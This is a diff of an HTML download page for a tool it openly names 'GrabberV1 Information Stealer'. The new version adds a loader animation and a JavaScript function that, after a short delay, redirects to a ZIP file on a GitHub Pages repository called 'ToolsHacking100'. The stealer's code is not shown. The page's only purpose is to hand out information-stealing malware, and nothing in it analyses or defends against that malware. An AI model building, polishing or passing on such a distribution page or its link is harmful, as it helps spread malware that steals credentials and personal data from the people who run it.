@@ -3,45 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grabber V1</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-        }
-
-        h1 {
-            margin-bottom: 20px;
-        }
-
-        .download-btn {
-            padding: 12px 24px;
-            font-size: 18px;
-            color: white;
-            background-color: #007BFF;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-
-        .download-btn:hover {
-            background-color: #0056b3;
-        }
-    </style>
+    <title>Download</title>
+    <link rel="stylesheet" href="style.css?v=2">
 </head>
 <body>
 
-    <h1>GrabberV1 Information Stealer</h1>
+    <div class="container">
+        <h1>TEST</h1>
+        <p class="subtitle">GrabberV1 Information Stealer</p>
 
-    <a href="https://kraker691-create.github.io/ToolsHacking100/GrabberV1.zip" download class="download-btn">
-        Download
-    </a>
+        <button class="download-btn" onclick="downloadFile()">
+            ⬇ Download
+        </button>
+
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <script>
+        function downloadFile() {
+            const loader = document.getElementById("loader");
+            loader.style.display = "block";
+
+            setTimeout(() => {
+                window.location.href = "https://kraker691-create.github.io/ToolsHacking100/GrabberV1.zip";
+            }, 1200);
+        }
+    </script>
 
 </body>
 </html>
